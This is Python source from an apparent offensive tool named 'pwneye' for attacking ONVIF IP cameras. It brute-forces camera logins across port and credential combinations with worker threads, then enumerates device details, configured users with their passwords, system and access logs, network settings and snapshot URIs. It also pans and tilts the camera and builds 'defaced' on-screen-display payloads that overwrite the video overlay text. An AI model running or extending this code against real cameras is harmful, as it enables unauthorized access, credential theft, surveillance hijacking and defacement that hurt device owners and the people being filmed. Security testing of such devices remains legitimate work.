import http.client
import queue
import ssl
import threading
import time
import traceback
from itertools import product
from types import SimpleNamespace
from typing import Optional, List, Dict, Any, Callable

from onvif import ONVIFClient, ONVIFDiscovery
from onvif.cli.interactive import InteractiveShell
from onvif.cli.utils import colorize
from pwneye.core.network import common as netcomm
from pwneye.core.types import ViewerOnvifContext

# TODO: Expand ONVIF capabilities (e.g. device reboot)

ONVIF_ATTEMPT_TIMEOUT = 3.5
ONVIF_PROBE_TIMEOUT = 1.5
ONVIF_DISCOVERY_ATTEMPTS = 3
ONVIF_DISCOVERY_RETRY_DELAY = 0.75
ONVIF_SERVICE_PATHS = [
    "/onvif/device_service",
    "/device_service",
]
ONVIF_PROBE_ENVELOPE = """<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <s:Body>
    <tds:GetSystemDateAndTime/>
  </s:Body>
</s:Envelope>"""

# ----------------------------------------------------------------------
# Low-level probe
# ----------------------------------------------------------------------


class PwneyeInteractiveShell(InteractiveShell):
    """
    Small wrapper around onvif-python's interactive shell with a quieter exit.
    """

    def do_quit(self, line):
        self._stop_health_check.set()
        return True

    def do_exit(self, line):
        return self.do_quit(line)

    def run(self):
        try:
            self.cmdloop()
        except KeyboardInterrupt:
            self._stop_health_check.set()
            raise


def _emphasize_shell_text(text: str) -> str:
    """
    Return a bold ANSI-styled text fragment for the interactive shell intro.
    """
    return f"\033[1m{text}\033[0m"


def _get_ptz_profile_token(client: ONVIFClient) -> str | None:
    """
    Return the first PTZ-capable media profile token exposed by the target.
    """
    try:
        ptz = client.ptz()
        media = client.media()
        profiles = media.GetProfiles()
    except Exception:
        return None

    for profile in profiles:
        profile_token = getattr(profile, "token", None)
        ptz_configuration = getattr(profile, "PTZConfiguration", None)

        if not profile_token or ptz_configuration is None:
            continue

        try:
            ptz.GetStatus(ProfileToken=profile_token)
            return str(profile_token)
        except Exception:
            try:
                ptz.GetCompatibleConfigurations(ProfileToken=profile_token)
                return str(profile_token)
            except Exception:
                continue

    return None


def _get_ptz_service_and_profile_token(client: ONVIFClient) -> tuple[Any, str] | None:
    """
    Return a PTZ service and compatible profile token for movement operations.
    """
    profile_token = _get_ptz_profile_token(client)
    if profile_token is None:
        return None

    try:
        service = client.ptz()
    except Exception:
        return None

    return service, profile_token


def _read_ptz_position(service: Any, profile_token: str) -> tuple[float | None, float | None] | None:
    """
    Read the current absolute PTZ pan/tilt position from the target.
    """
    try:
        status = service.GetStatus(ProfileToken=profile_token)
    except Exception:
        return None

    position = getattr(status, "Position", None)
    if position is None:
        return None

    pan_tilt = getattr(position, "PanTilt", None)
    if pan_tilt is None:
        return None

    x = getattr(pan_tilt, "x", None)
    y = getattr(pan_tilt, "y", None)

    try:
        x_value = None if x is None else float(x)
        y_value = None if y is None else float(y)
    except Exception:
        return None

    return x_value, y_value


def get_current_ptz_position(client: ONVIFClient) -> tuple[float | None, float | None] | None:
    """
    Return the current PTZ pan/tilt position when available.
    """
    ptz_context = _get_ptz_service_and_profile_token(client)
    if ptz_context is None:
        return None

    service, profile_token = ptz_context
    return _read_ptz_position(service, profile_token)


def supports_ptz(client: ONVIFClient) -> bool:
    """
    Return whether the target exposes a PTZ-capable ONVIF media profile.
    """
    return _get_ptz_profile_token(client) is not None


def move_in_direction(
    client: ONVIFClient,
    *,
    direction: str,
    duration: float,
    poll_interval: float = 0.15,
) -> dict[str, Any]:
    """
    Move the target PTZ position using a smooth ContinuousMove request for a
    fixed direction and duration.
    """
    payload = {
        "ok": False,
        "requested": {
            "direction": direction,
            "duration": float(duration),
        },
        "initial": None,
        "final": None,
        "detail": None,
    }

    ptz_context = _get_ptz_service_and_profile_token(client)
    if ptz_context is None:
        payload["detail"] = "PTZ movement is not available on this target"
        return payload

    service, profile_token = ptz_context

    start_position = _read_ptz_position(service, profile_token)
    payload["initial"] = start_position
    if start_position is None:
        payload["detail"] = "Unable to read the current PTZ position"
        return payload
    if start_position[0] is None or start_position[1] is None:
        payload["detail"] = "The target did not report a usable initial PTZ position"
        return payload

    vector_map: dict[str, tuple[float, float]] = {
        "left": (-0.6, 0.0),
        "right": (0.6, 0.0),
        "up": (0.0, 0.6),
        "down": (0.0, -0.6),
    }
    direction_key = str(direction).strip().lower()
    velocity = vector_map.get(direction_key)
    if velocity is None:
        payload["detail"] = "The requested PTZ direction is not supported"
        return payload
    pan_velocity, tilt_velocity = velocity

    def stop_motion() -> None:
        try:
            service.Stop(
                ProfileToken=profile_token,
                PanTilt=True,
                Zoom=False,
            )
        except Exception:
            pass

    try:
        service.ContinuousMove(
            ProfileToken=profile_token,
            Velocity={
                "PanTilt": {
                    "x": pan_velocity,
                    "y": tilt_velocity,
                }
            },
        )
    except Exception:
        payload["detail"] = "The ONVIF PTZ move request was rejected or not supported"
        return payload

    try:
        time.sleep(float(duration))
    finally:
        stop_motion()

    final_deadline = time.monotonic() + max(0.60, min(1.20, float(duration) * 0.35))
    final_position = start_position
    while time.monotonic() < final_deadline:
        time.sleep(max(0.08, poll_interval))
        updated_position = _read_ptz_position(service, profile_token)
        if updated_position is None:
            continue
        if updated_position[0] is None or updated_position[1] is None:
            continue
        final_position = updated_position
        payload["final"] = updated_position

    if payload["final"] is None:
        payload["final"] = final_position

    if payload["final"] is None:
        payload["detail"] = "Unable to read the final PTZ position"
        return payload

    payload["ok"] = True
    return payload


def build_ptz_viewer_context(
    host: str,
    port: int,
    username: str,
    password: str,
) -> ViewerOnvifContext | None:
    """
    Build a viewer-side ONVIF PTZ context if the target supports movement.
    """
    client = try_onvif_connection(
        host=host,
        port=port,
        username=username,
        password=password,
    )
    if client is None or not supports_ptz(client):
        return None

    return ViewerOnvifContext(
        host=host,
        port=port,
        username=username,
        password=password,
        ptz_supported=True,
    )


class PtzController:
    """
    Lightweight ONVIF PTZ controller for the dedicated live preview client.
    """

    def __init__(self, context: ViewerOnvifContext) -> None:
        self.context = context
        self._client: ONVIFClient | None = None
        self._service = None
        self._profile_token: str | None = None
        self._active_vector: tuple[float, float] = (0.0, 0.0)

    def _ensure_ready(self) -> bool:
        if self._service is not None and self._profile_token is not None:
            return True

        if self._client is None:
            self._client = try_onvif_connection(
                host=self.context.host,
                port=self.context.port,
                username=self.context.username,
                password=self.context.password,
            )
            if self._client is None:
                return False

        profile_token = _get_ptz_profile_token(self._client)
        if profile_token is None:
            return False

        try:
            self._service = self._client.ptz()
        except Exception:
            self._service = None
            return False

        self._profile_token = profile_token
        return True

    def move(self, *, pan: float = 0.0, tilt: float = 0.0) -> bool:
        """
        Start or update a continuous PTZ move.
        """
        if not self._ensure_ready():
            return False

        target_vector = (float(pan), float(tilt))
        if target_vector == self._active_vector:
            return True

        try:
            self._service.ContinuousMove(
                ProfileToken=self._profile_token,
                Velocity={
                    "PanTilt": {
                        "x": target_vector[0],
                        "y": target_vector[1],
                    }
                },
            )
            self._active_vector = target_vector
            return True
        except Exception:
            return False

    def stop(self) -> bool:
        """
        Stop the current PTZ movement.
        """
        if not self._ensure_ready():
            self._active_vector = (0.0, 0.0)
            return False

        try:
            self._service.Stop(
                ProfileToken=self._profile_token,
                PanTilt=True,
                Zoom=False,
            )
            self._active_vector = (0.0, 0.0)
            return True
        except Exception:
            return False

    def stop_async(self) -> None:
        """
        Fire a best-effort PTZ stop in the background without blocking the caller.
        """
        self._active_vector = (0.0, 0.0)
        threading.Thread(target=self.stop, daemon=True).start()

    def current_position(self) -> tuple[float | None, float | None] | None:
        """
        Return the current absolute PTZ pan/tilt position when the device reports it.
        """
        if not self._ensure_ready():
            return None

        try:
            status = self._service.GetStatus(ProfileToken=self._profile_token)
        except Exception:
            return None

        position = getattr(status, "Position", None)
        if position is None:
            return None

        pan_tilt = getattr(position, "PanTilt", None)
        if pan_tilt is None:
            return None

        x = getattr(pan_tilt, "x", None)
        y = getattr(pan_tilt, "y", None)

        try:
            x_value = None if x is None else float(x)
            y_value = None if y is None else float(y)
        except Exception:
            return None

        return x_value, y_value

def probe_onvif_service(
    host: str,
    port: int,
) -> bool:
    """
    Check whether a port appears to expose an ONVIF Device service.
    """
    connection_cls = http.client.HTTPSConnection if port in (443, 8443) else http.client.HTTPConnection
    context = None

    if connection_cls is http.client.HTTPSConnection:
        context = ssl._create_unverified_context()

    for path in ONVIF_SERVICE_PATHS:
        conn = None
        try:
            if context is not None:
                conn = connection_cls(host, port, timeout=ONVIF_PROBE_TIMEOUT, context=context)
            else:
                conn = connection_cls(host, port, timeout=ONVIF_PROBE_TIMEOUT)

            conn.request(
                "POST",
                path,
                body=ONVIF_PROBE_ENVELOPE.encode("utf-8"),
                headers={
                    "Content-Type": (
                        'application/soap+xml; charset=utf-8; '
                        'action="http://www.onvif.org/ver10/device/wsdl/GetSystemDateAndTime"'
                    ),
                },
            )
            response = conn.getresponse()
            body = response.read().decode("utf-8", errors="ignore").lower()

            if response.status in (200, 401, 403):
                return True

            if response.status in (400, 405, 415) and (
                "onvif" in body
                or "soap" in body
                or "www-authenticate" in body
            ):
                return True

        except Exception:
            continue
        finally:
            try:
                if conn is not None:
                    conn.close()
            except Exception:
                pass

    return False

def try_onvif_connection(
    host: str,
    port: int,
    username: str,
    password: str,
) -> Optional[ONVIFClient]:
    """
    Try a single ONVIF connection attempt.

    Returns:
        ONVIFClient instance if successful, None otherwise.
    """
    result_queue: queue.Queue[Optional[ONVIFClient]] = queue.Queue(maxsize=1)

    def runner() -> None:
        try:
            client = ONVIFClient(
                host=host,
                port=port,
                username=username,
                password=password,
                timeout=3
            )

            # Minimal validation call
            device = client.devicemgmt()
            device.GetDeviceInformation()

            result_queue.put(client)
        except Exception:
            result_queue.put(None)

    worker = threading.Thread(target=runner, daemon=True)
    worker.start()
    worker.join(timeout=ONVIF_ATTEMPT_TIMEOUT)

    if worker.is_alive():
        return None

    try:
        return result_queue.get_nowait()
    except queue.Empty:
        return None


# ----------------------------------------------------------------------
# Detection
# ----------------------------------------------------------------------

def detect(
    host: str,
    ports: List[int],
    usernames: List[str],
    passwords: List[str],
    threads: int = 1,
    on_attempt: Optional[Callable[[int, str, str], None]] = None,
    on_port_check: Optional[Callable[[int], None]] = None,
    on_port_detected: Optional[Callable[[int], None]] = None,
    responsive_ports: Optional[List[int]] = None,
    on_progress: Optional[Callable[[int, int, int, str, str], None]] = None,
) -> Optional[Dict[str, Any]]:
    """
    Detect ONVIF support by trying all port / credential combinations.

    Returns:
        {
            "client": ONVIFClient,
            "port": int,
            "username": str,
            "password": str,
        }
        or None if ONVIF is not detected.
    """
    if responsive_ports is None:
        responsive_ports = []
        for port in ports:
            if on_port_check is not None:
                on_port_check(port)

            if not netcomm.is_tcp_port_open(host, port, timeout=1.0):
                continue

            if probe_onvif_service(host, port):
                if on_port_detected is not None:
                    on_port_detected(port)
                responsive_ports.append(port)
                break

    tasks = [
        (port, username, password)
        for username, password, port in product(usernames, passwords, responsive_ports)
    ]
    if not tasks:
        return None

    task_queue: queue.Queue[tuple[int, str, str]] = queue.Queue()
    stop_event = threading.Event()
    state_lock = threading.Lock()

    result: Optional[Dict[str, Any]] = None
    completed = 0

    for task in tasks:
        task_queue.put(task)

    def worker() -> None:
        nonlocal result, completed

        while not stop_event.is_set():
            try:
                port, username, password = task_queue.get_nowait()
            except queue.Empty:
                return

            try:
                with state_lock:
                    if on_progress is not None:
                        on_progress(completed, len(tasks), port, username, password)
                if on_attempt is not None:
                    on_attempt(port, username, password)

                client = try_onvif_connection(
                    host=host,
                    port=port,
                    username=username,
                    password=password,
                )

                if client:
                    with state_lock:
                        if result is None:
                            result = {
                                "camera": client,
                                "port": port,
                                "username": username,
                                "password": password,
                                "responsive_ports": list(responsive_ports),
                            }
                            stop_event.set()
            finally:
                with state_lock:
                    completed += 1
                    if on_progress is not None:
                        on_progress(completed, len(tasks), port, username, password)
                task_queue.task_done()

    worker_count = max(1, min(threads, len(tasks)))
    workers = [
        threading.Thread(target=worker, daemon=True)
        for _ in range(worker_count)
    ]

    try:
        for thread in workers:
            thread.start()

        for thread in workers:
            thread.join()
    except KeyboardInterrupt:
        stop_event.set()
        raise

    if result is None:
        return {
            "camera": None,
            "port": None,
            "username": None,
            "password": None,
            "responsive_ports": list(responsive_ports),
        } if responsive_ports else None

    return result


def discover(
    timeout: int = 4,
    attempts: int = ONVIF_DISCOVERY_ATTEMPTS,
    interface: str | None = None,
) -> List[Dict[str, Any]]:
    """
    Discover ONVIF devices on the local network via WS-Discovery.

    Returns:
        List of discovered devices with host, port, scopes, types and XAddrs.
    """
    for attempt in range(max(1, attempts)):
        try:
            discovery = ONVIFDiscovery(timeout=timeout, interface=interface)
            devices = discovery.discover()
        except Exception:
            devices = []

        if devices:
            return devices

        if attempt < max(1, attempts) - 1:
            time.sleep(ONVIF_DISCOVERY_RETRY_DELAY)

    return []


# ----------------------------------------------------------------------
# Enumeration helpers
# ----------------------------------------------------------------------

def get_device_info(client: ONVIFClient) -> Optional[Dict[str, str]]:
    """
    Extract basic device information.

    Returns None if information cannot be retrieved.
    """
    try:
        device = client.devicemgmt()
        info = device.GetDeviceInformation()
    except Exception:
        return None

    return {
        "Manufacturer": getattr(info, "Manufacturer", ""),
        "Model": getattr(info, "Model", ""),
        "Firmware": getattr(info, "FirmwareVersion", ""),
        "Serial": getattr(info, "SerialNumber", ""),
        "Hardware_id": getattr(info, "HardwareId", ""),
    }


def get_users(client: ONVIFClient) -> List[Dict[str, str]]:
    """
    Extract configured users via the ONVIF Device service.

    Returns empty list if the operation is not supported or not authorized.
    """
    users_out: List[Dict[str, str]] = []

    try:
        device = client.devicemgmt()
        users = device.GetUsers()
    except Exception:
        return users_out

    for user in users:
        username = getattr(user, "Username", "") or ""
        password = getattr(user, "Password", "") or ""
        user_level = getattr(user, "UserLevel", "") or ""

        users_out.append({
            "Username": username,
            "Password": password,
            "UserLevel": str(user_level),
        })

    return users_out


def get_system_logs(client: ONVIFClient) -> List[Dict[str, str]]:
    """
    Extract available ONVIF system logs via the Device service.

    Returns empty list if the operation is not supported or not authorized.
    """
    logs_out: List[Dict[str, str]] = []

    try:
        device = client.devicemgmt()
    except Exception:
        return logs_out

    for log_type in ("System", "Access"):
        try:
            response = device.GetSystemLog(log_type)
        except Exception:
            continue

        content = ""

        try:
            content = getattr(response, "String", "") or ""
        except Exception:
            content = ""

        if not content:
            try:
                binary = getattr(response, "Binary", None)
                if binary is not None:
                    content = str(binary)
            except Exception:
                content = ""

        content = content.strip()
        if not content:
            continue

        logs_out.append({
            "LogType": log_type,
            "Content": content,
        })

    return logs_out


def get_network_settings(client: ONVIFClient) -> Dict[str, str]:
    """
    Extract global network settings via the ONVIF Device service.

    Returns empty dict if the information cannot be retrieved.
    """
    settings: Dict[str, str] = {}

    try:
        device = client.devicemgmt()
    except Exception:
        return settings

    # Hostname
    try:
        hostname = device.GetHostname()
        name = getattr(hostname, "Name", "") or ""
        if name:
            settings["hostname"] = name
    except Exception:
        pass

    # Default gateway
    try:
        gateway = device.GetNetworkDefaultGateway()
        ipv4 = getattr(gateway, "IPv4Address", None) or []
        ipv6 = getattr(gateway, "IPv6Address", None) or []

        values = [str(value) for value in ipv4 if value]
        values.extend(str(value) for value in ipv6 if value)

        if values:
            settings["gateway"] = ",".join(values)
    except Exception:
        pass

    # DNS
    try:
        dns = device.GetDNS()
        values: List[str] = []

        dns_from_dhcp = getattr(dns, "FromDHCP", None)
        if dns_from_dhcp:
            values.append("dhcp")

        manual = getattr(dns, "DNSManual", None) or []
        for entry in manual:
            ipv4 = getattr(entry, "IPv4Address", None)
            ipv6 = getattr(entry, "IPv6Address", None)
            if ipv4:
                values.append(str(ipv4))
            if ipv6:
                values.append(str(ipv6))

        search_domain = getattr(dns, "SearchDomain", None) or []
        values.extend(str(value) for value in search_domain if value)

        if values:
            settings["dns"] = ",".join(values)
    except Exception:
        pass

    # NTP
    try:
        ntp = device.GetNTP()
        values: List[str] = []

        ntp_from_dhcp = getattr(ntp, "FromDHCP", None)
        if ntp_from_dhcp:
            values.append("dhcp")

        manual = getattr(ntp, "NTPManual", None) or []
        for entry in manual:
            ipv4 = getattr(entry, "IPv4Address", None)
            ipv6 = getattr(entry, "IPv6Address", None)
            dnsname = getattr(entry, "DNSname", None)

            if ipv4:
                values.append(str(ipv4))
            if ipv6:
                values.append(str(ipv6))
            if dnsname:
                values.append(str(dnsname))

        if values:
            settings["ntp"] = ",".join(values)
    except Exception:
        pass

    # Network protocols
    try:
        protocols = device.GetNetworkProtocols()
        values: List[str] = []

        for proto in protocols:
            name = getattr(proto, "Name", "") or ""
            ports = getattr(proto, "Port", None) or []

            label = name.lower() if name else "unknown"

            if ports:
                port_list = ",".join(str(port) for port in ports if port is not None)
                label = f"{label}:{port_list}"

            values.append(label)

        if values:
            settings["protocols"] = ",".join(values)
    except Exception:
        pass

    return settings


def get_profiles(client: ONVIFClient) -> List[Dict[str, str]]:
    """
    Enumerate media profiles.
    """
    profiles_out: List[Dict[str, str]] = []

    try:
        media = client.media()
        profiles = media.GetProfiles()
    except Exception:
        return profiles_out

    for profile in profiles:
        try:
            token = profile.token
        except AttributeError:
            continue

        name = getattr(profile, "Name", "")

        encoding = ""
        resolution = ""

        # Video encoder configuration (optional)
        try:
            video_cfg = profile.VideoEncoderConfiguration
            encoding = video_cfg.Encoding

            if hasattr(video_cfg, "Resolution"):
                res = video_cfg.Resolution
                resolution = f"{res.Width}x{res.Height}"
        except Exception:
            pass

        profiles_out.append({
            "token": token,
            "name": name,
            "encoding": encoding,
            "resolution": resolution,
        })

    return profiles_out


def get_snapshot_uris(client: ONVIFClient) -> List[Dict[str, str]]:
    """
    Extract ONVIF SnapshotUri values profile by profile.
    """
    snapshot_uris: List[Dict[str, str]] = []

    try:
        media = client.media()
        profiles = media.GetProfiles()
    except Exception:
        return snapshot_uris

    for profile in profiles:
        profile_token = getattr(profile, "token", None)
        if not profile_token:
            continue

        profile_name = getattr(profile, "Name", "") or str(profile_token)

        try:
            response = media.GetSnapshotUri(ProfileToken=profile_token)
        except Exception:
            continue

        uri = getattr(response, "Uri", "") or ""
        if not uri:
            continue

        snapshot_uris.append({
            "profile": str(profile_name),
            "token": str(profile_token),
            "uri": str(uri),
        })

    return snapshot_uris


def _extract_osd_configuration_tokens(profile: Any) -> list[str]:
    """
    Collect likely OSD-related configuration tokens from a media profile.
    """
    tokens: list[str] = []

    profile_token = getattr(profile, "token", None)
    if profile_token:
        tokens.append(str(profile_token))

    video_source_cfg = getattr(profile, "VideoSourceConfiguration", None)
    if video_source_cfg is not None:
        cfg_token = getattr(video_source_cfg, "token", None)
        if cfg_token:
            tokens.append(str(cfg_token))

        source_token = getattr(video_source_cfg, "SourceToken", None)
        if source_token:
            tokens.append(str(source_token))

    seen: set[str] = set()
    return [token for token in tokens if not (token in seen or seen.add(token))]


def _media_service_candidates(client: ONVIFClient) -> list[Any]:
    """
    Return available ONVIF media service wrappers.
    """
    services: list[Any] = []

    for getter_name in ("media", "media2"):
        getter = getattr(client, getter_name, None)
        if getter is None:
            continue

        try:
            service = getter()
        except Exception:
            continue

        if service is not None:
            services.append(service)

    return services


def _iter_osd_entries(client: ONVIFClient) -> list[tuple[Any, Any]]:
    """
    Return raw OSD entries paired with the service that exposed them.
    """
    entries: list[tuple[Any, Any]] = []
    seen_tokens: set[str] = set()

    def add_osd(service: Any, osd: Any) -> None:
        token = str(getattr(osd, "token", None) or getattr(osd, "Token", None) or "")
        if token and token in seen_tokens:
            return

        if token:
            seen_tokens.add(token)
        entries.append((service, osd))

    for service in _media_service_candidates(client):
        try:
            osds = service.GetOSDs()
        except Exception:
            osds = []

        for osd in osds or []:
            add_osd(service, osd)

        if entries:
            continue

        try:
            profiles = service.GetProfiles()
        except Exception:
            profiles = []

        for profile in profiles or []:
            for token in _extract_osd_configuration_tokens(profile):
                try:
                    osds = service.GetOSDs(ConfigurationToken=token)
                except Exception:
                    continue

                for osd in osds or []:
                    add_osd(service, osd)

    return entries


def _serialize_osd_color(color: Any) -> dict[str, Any] | None:
    """
    Convert an ONVIF OSD color object into a SetOSD-safe dictionary.
    """
    if color is None:
        return None

    color_value = getattr(color, "Color", None)
    if color_value is None:
        return None

    payload: dict[str, Any] = {}

    transparent = getattr(color, "Transparent", None)
    if transparent is not None:
        payload["Transparent"] = transparent

    payload["Color"] = {
        key: value
        for key, value in {
            "X": getattr(color_value, "X", None),
            "Y": getattr(color_value, "Y", None),
            "Z": getattr(color_value, "Z", None),
            "Colorspace": getattr(color_value, "Colorspace", None),
        }.items()
        if value is not None
    }

    if not payload["Color"]:
        return None

    return payload


def _serialize_osd_position(position: Any) -> dict[str, Any] | None:
    """
    Convert an ONVIF OSD position object into a SetOSD-safe dictionary.
    """
    if position is None:
        return None

    payload: dict[str, Any] = {}

    position_type = getattr(position, "Type", None) or getattr(position, "type", None)
    if position_type is not None:
        payload["Type"] = position_type

    pos = getattr(position, "Pos", None)
    if pos is not None:
        coords = {
            key: value
            for key, value in {
                "x": getattr(pos, "x", None),
                "y": getattr(pos, "y", None),
                "space": getattr(pos, "space", None),
            }.items()
            if value is not None
        }
        if coords:
            payload["Pos"] = coords

    return payload or None


def _centered_osd_x_offset(message: str) -> float:
    """
    Estimate a leftward X offset so the rendered text appears more centered.

    ONVIF does not expose the final rendered text width, so this is an
    intentionally conservative heuristic based on message length.
    """
    normalized = " ".join(message.split())
    length = len(normalized) if normalized else len(message)

    # Best-effort estimate for a typical OSD glyph width in ONVIF normalized
    # coordinates. Clamp so longer strings still remain on-screen.
    estimated_half_width = min(0.72, max(0.0, length * 0.016))
    return -estimated_half_width


def _serialize_osd_reference(value: Any) -> dict[str, Any] | str | None:
    """
    Convert an ONVIF OSDReference-like object into a SetOSD-safe value.
    """
    if value is None:
        return None

    simple_value = getattr(value, "_value_1", None)
    if simple_value not in (None, ""):
        return {"_value_1": str(simple_value)}

    if isinstance(value, str):
        return value

    text_value = str(value).strip()
    if text_value:
        return text_value

    return None


def _extract_osd_entry_token(osd: Any) -> str:
    """
    Return the token associated with an OSD entry, if any.
    """
    return str(getattr(osd, "token", None) or getattr(osd, "Token", None) or "")


def _extract_osd_text_type(osd: Any) -> str:
    """
    Return the OSD text type, if any.
    """
    text_string = getattr(osd, "TextString", None)
    if text_string is None:
        return ""

    return str(getattr(text_string, "Type", None) or "")


def _extract_osd_plain_text(osd: Any) -> str:
    """
    Return the OSD plain text, if any.
    """
    text_string = getattr(osd, "TextString", None)
    if text_string is None:
        return ""

    return str(getattr(text_string, "PlainText", None) or "")


def _find_osd_entry_by_token(
    client: ONVIFClient,
    token: str,
) -> Any | None:
    """
    Search all visible OSD entries and return the one matching the requested token.
    """
    if not token:
        return None

    for _, osd in _iter_osd_entries(client):
        if _extract_osd_entry_token(osd) == token:
            return osd

    return None


def _build_defaced_osd_payload(osd: Any, message: str) -> dict[str, Any]:
    """
    Build a minimal standards-compliant SetOSD payload.

    This intentionally excludes vendor-specific extension fields gathered from
    GetOSDs, because round-tripping those flattened values back into SetOSD is
    not reliable across devices and Zeep type bindings.
    """
    token = str(getattr(osd, "token", None) or getattr(osd, "Token", None) or "")
    video_source_token = _serialize_osd_reference(
        getattr(osd, "VideoSourceConfigurationToken", None)
    )
    existing_text = getattr(osd, "TextString", None)

    payload: dict[str, Any] = {
        "token": token,
        "Type": "Text",
        "Position": {
            "Type": "Custom",
            "Pos": {
                "x": _centered_osd_x_offset(message),
                "y": 0.0,
            },
        },
        "TextString": {
            "Type": "Plain",
            "PlainText": message,
        },
    }

    if video_source_token is not None:
        payload["VideoSourceConfigurationToken"] = video_source_token

    if existing_text is not None:
        font_size = getattr(existing_text, "FontSize", None)
        if font_size is not None:
            payload["TextString"]["FontSize"] = font_size

        font_color = _serialize_osd_color(getattr(existing_text, "FontColor", None))
        if font_color is not None:
            payload["TextString"]["FontColor"] = font_color

        background_color = _serialize_osd_color(getattr(existing_text, "BackgroundColor", None))
        if background_color is not None:
            payload["TextString"]["BackgroundColor"] = background_color

    if existing_text is not None:
        persistent = getattr(existing_text, "IsPersistentText", None)
        if persistent is not None:
            payload["TextString"]["IsPersistentText"] = persistent

    return payload


def _serialize_text_string(text_string: Any) -> dict[str, Any]:
    """
    Convert an ONVIF text string object into a SetOSD-safe dictionary.
    """
    if text_string is None:
        return {}

    payload: dict[str, Any] = {}

    text_type = getattr(text_string, "Type", None)
    if text_type is not None:
        payload["Type"] = str(text_type)

    plain_text = getattr(text_string, "PlainText", None)
    if plain_text is not None:
        payload["PlainText"] = str(plain_text)

    font_size = getattr(text_string, "FontSize", None)
    if font_size is not None:
        payload["FontSize"] = font_size

    font_color = _serialize_osd_color(getattr(text_string, "FontColor", None))
    if font_color is not None:
        payload["FontColor"] = font_color

    background_color = _serialize_osd_color(getattr(text_string, "BackgroundColor", None))
    if background_color is not None:
        payload["BackgroundColor"] = background_color

    persistent = getattr(text_string, "IsPersistentText", None)
    if persistent is not None:
        payload["IsPersistentText"] = persistent

    return payload


def _serialize_osd_restore_payload(osd: Any) -> dict[str, Any]:
    """
    Convert an existing OSD entry into a minimal restore payload.
    """
    token = _extract_osd_entry_token(osd)
    payload: dict[str, Any] = {
        "token": token,
    }

    osd_type = getattr(osd, "Type", None)
    if osd_type is not None:
        payload["Type"] = str(osd_type)

    video_source_token = _serialize_osd_reference(
        getattr(osd, "VideoSourceConfigurationToken", None)
    )
    if video_source_token is not None:
        payload["VideoSourceConfigurationToken"] = video_source_token

    position = _serialize_osd_position(getattr(osd, "Position", None))
    if position is not None:
        payload["Position"] = position

    text_payload = _serialize_text_string(getattr(osd, "TextString", None))
    if text_payload:
        payload["TextString"] = text_payload

    return payload


def _restore_osd_payload_matches(expected: dict[str, Any], current: Any) -> bool:
    """
    Return True if the current OSD entry still matches the expected restore payload.
    """
    current_type = str(getattr(current, "Type", None) or "")
    expected_type = str(expected.get("Type") or "")
    if expected_type and current_type != expected_type:
        return False

    expected_text = expected.get("TextString") or {}
    if expected_text:
        current_text = getattr(current, "TextString", None)
        current_text_type = str(getattr(current_text, "Type", None) or "")
        expected_text_type = str(expected_text.get("Type") or "")
        if expected_text_type and current_text_type != expected_text_type:
            return False

        expected_plain = str(expected_text.get("PlainText") or "")
        current_plain = str(getattr(current_text, "PlainText", None) or "")
        if current_plain != expected_plain:
            return False

    expected_position = expected.get("Position") or {}
    if expected_position:
        current_position = getattr(current, "Position", None)
        current_position_type = str(
            getattr(current_position, "Type", None) or getattr(current_position, "type", None) or ""
        )
        expected_position_type = str(expected_position.get("Type") or "")
        if expected_position_type and current_position_type != expected_position_type:
            return False

        expected_pos = expected_position.get("Pos") or {}
        if expected_pos:
            current_pos = getattr(current_position, "Pos", None)
            current_x = _coerce_numeric(getattr(current_pos, "x", None))
            current_y = _coerce_numeric(getattr(current_pos, "y", None))
            expected_x = _coerce_numeric(expected_pos.get("x"))
            expected_y = _coerce_numeric(expected_pos.get("y"))

            if expected_x is not None and (current_x is None or abs(float(current_x) - float(expected_x)) > 0.01):
                return False
            if expected_y is not None and (current_y is None or abs(float(current_y) - float(expected_y)) > 0.01):
                return False

    return True


def _capture_osd_restore_payloads(client: ONVIFClient) -> list[dict[str, Any]]:
    """
    Capture restore payloads for writable Text/Plain OSD entries.
    """
    payloads: list[dict[str, Any]] = []

    for _, osd in _iter_osd_entries(client):
        osd_type = str(getattr(osd, "Type", None) or "")
        text_type = _extract_osd_text_type(osd)
        if osd_type != "Text" or text_type != "Plain":
            continue

        payload = _serialize_osd_restore_payload(osd)
        if payload.get("token"):
            payloads.append(payload)

    return payloads


def supports_osd(client: ONVIFClient) -> bool:
    """
    Best-effort check for ONVIF OSD management support using read-only probes.
    """
    for service in _media_service_candidates(client):
        try:
            profiles = service.GetProfiles()
        except Exception:
            profiles = []

        try:
            service.GetOSDs()
            return True
        except Exception:
            pass

        for profile in profiles or []:
            for token in _extract_osd_configuration_tokens(profile):
                try:
                    service.GetOSDOptions(ConfigurationToken=token)
                    return True
                except Exception:
                    pass

                try:
                    service.GetOSDs(ConfigurationToken=token)
                    return True
                except Exception:
                    pass

    return False


def supports_osd_deface(client: ONVIFClient) -> bool:
    """
    Return True only if the device exposes at least one Text/Plain OSD entry.
    """
    for _, osd in _iter_osd_entries(client):
        osd_type = str(getattr(osd, "Type", None) or "")
        text_type = _extract_osd_text_type(osd)
        if osd_type == "Text" and text_type == "Plain":
            return True

    return False


def _imaging_service(client: ONVIFClient) -> Any | None:
    """
    Return the ONVIF imaging service wrapper when available.
    """
    getter = getattr(client, "imaging", None)
    if getter is None:
        return None

    try:
        return getter()
    except Exception:
        return None


def _video_source_tokens(client: ONVIFClient) -> list[str]:
    """
    Collect likely video source tokens for ONVIF imaging operations.
    """
    tokens: list[str] = []
    seen: set[str] = set()

    def add_token(value: Any) -> None:
        token = str(value).strip() if value is not None else ""
        if not token or token in seen:
            return

        seen.add(token)
        tokens.append(token)

    for service in _media_service_candidates(client):
        try:
            profiles = service.GetProfiles()
        except Exception:
            profiles = []

        for profile in profiles or []:
            video_source_cfg = getattr(profile, "VideoSourceConfiguration", None)
            if video_source_cfg is not None:
                add_token(getattr(video_source_cfg, "SourceToken", None))

    return tokens


def _coerce_numeric(value: Any) -> float | int | None:
    """
    Convert ONVIF numeric values or wrappers to a comparable scalar.
    """
    if isinstance(value, (int, float)):
        return value

    for attr in ("_value_1", "Value", "value"):
        nested = getattr(value, attr, None)
        if isinstance(nested, (int, float)):
            return nested
        if isinstance(nested, str):
            try:
                numeric = float(nested)
            except ValueError:
                continue
            return int(numeric) if numeric.is_integer() else numeric

    if isinstance(value, str):
        try:
            numeric = float(value)
        except ValueError:
            return None
        return int(numeric) if numeric.is_integer() else numeric

    return None


